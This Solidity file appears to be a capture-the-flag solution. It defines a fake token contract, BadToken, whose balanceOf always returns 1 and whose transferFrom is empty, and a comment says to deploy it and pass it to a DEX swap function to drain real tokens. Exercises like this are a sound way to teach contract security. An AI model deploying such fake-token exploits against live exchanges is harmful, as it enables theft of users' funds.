//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @dev Deploy BadToken, then call `swap(Badtoken, token1 or token2, 1)`
 */
contract BadToken {
    function balanceOf(address) external pure returns (uint256) {
        return 1;
    }

    function transferFrom(address, address, uint256) external pure returns (bool) {}
}
















